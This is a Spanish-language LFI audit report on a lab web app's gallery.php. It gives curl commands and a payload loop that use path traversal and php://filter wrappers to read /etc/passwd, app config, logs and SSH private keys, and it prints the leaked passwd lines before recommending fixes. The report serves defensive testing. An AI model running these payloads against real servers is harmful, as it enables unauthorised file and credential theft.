# Informe LFI - Galería de Arte Virtual

Fecha (local): 2026-04-27T15:34:57Z
Objetivo: Auditoría LFI de http://web.dev.local:8081

Resumen ejecutivo:
- Se identificó una vulnerabilidad de Local File Inclusion en el parámetro `page` de `gallery.php`.
- Fue posible leer archivos del sistema, incluyendo `/etc/passwd`. Impacto: divulgación de información del sistema y usuarios; posible escalada adicional.

URL y parámetro vulnerable
- URL objetivo base: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page
- Ejemplo vulnerable: http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd

Comandos exactos ejecutados (recon y explotación automatizada)
- Recon y pruebas por lote (curl):
  mkdir -p /tmp/lfi_scan && outfile=/tmp/lfi_scan/gallery_results.txt
  payloads=("../../../../../../etc/passwd" "../../../../../../../../etc/passwd" "/etc/passwd" "../../../../../../var/www/html/config.php" "../../../../../../../../var/log/apache2/access.log" "../../../../../../../../proc/self/environ" "../../../../../../../../home/user/.ssh/id_rsa")
  for p in "${payloads[@]}"; do 
    curl -s "http://web.dev.local:8081/gallery.php?page=$p" >> "$outfile"; 
    curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=$p" >> "$outfile"; 
  done

- Pruebas manuales individuales (ejemplos):
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
  curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd"

Payloads que permitieron descubrir archivos de la aplicación o del sistema
- Traversal simple: ../../../../../../etc/passwd
- Traversal extendido: ../../../../../../../../etc/passwd
- Absolute path: /etc/passwd
- php://filter para evadir filtros y obtener base64: php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
- Otros intentos (sin éxito en este laboratorio): ../../../../../../var/www/html/config.php, ../../../../../../../../home/user/.ssh/id_rsa, ../../../../../../../../etc/shadow

Evidencia de explotación
- Contenido retornado (fragmento de /etc/passwd obtenido vía LFI):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Resultado con php://filter (base64) también fue devuelto por la aplicación; el contenido decodificado contiene las mismas entradas de /etc/passwd.

Impacto observado
- Divulgación de información sensible del sistema operativo (usuarios del sistema, posibles rutas de webroot y usuarios con privilegios).
- Alta probabilidad de poder usar técnicas adicionales (log poisoning, proc/self/environ, inclusion de shells remotos) para intentar RCE en entornos reales.

Limitaciones y notas
- No se encontraron (en esta ejecución) claves privadas SSH ni /etc/shadow legible; dichos ficheros pueden estar protegidos por permisos, o en ubicaciones no accesibles desde el contexto del proceso web.
- No se intentó escalado completo a RCE destructivo ni acciones de post-explotación que puedan afectar la integridad del sistema; solo lectura no destructiva para pruebas.

Recomendaciones
1. Validar y sanitizar estrictamente el parámetro `page` (whitelist de vistas permitidas). No incluir archivos basándose directamente en parámetros del usuario.
2. Evitar concatenar rutas con entradas del usuario; usar mapeos controlados (por ejemplo, un switch o array que mapea nombres de página a archivos en servidor).
3. Deshabilitar wrappers peligrosos o filtrar `php://` y similares en entradas de usuario si es posible.
4. Ajustar permisos: archivos sensibles (e.g., /etc/shadow, claves) no deben ser accesibles por el usuario del proceso web.
5. Registrar y monitorizar intentos de traversal y bloquear patrones como ".." o uso de wrappers en WAF/IPS.

Comandos útiles para mitigación y verificación
- Verificar servidor web y permisos: ls -l /var/www/html && ps aux | grep -i apache
- Parche rápido (ejemplo de whitelist en PHP):
  $allowed = ['modern','classic','abstract','about'];
  $page = $_GET['page'] ?? 'modern';
  if (!in_array($page, $allowed)) { $page = '404'; }
  include __DIR__ . '/views/' . $page . '.php';

Conclusión
- VULN FOUND: confirmado mediante lectura de /etc/passwd.
- VULN EXPLOITED: lectura de fichero crítico del sistema (/etc/passwd) completada.

Reporte generado localmente y guardado en este fichero para revisión adicional.

-- Fin del informe
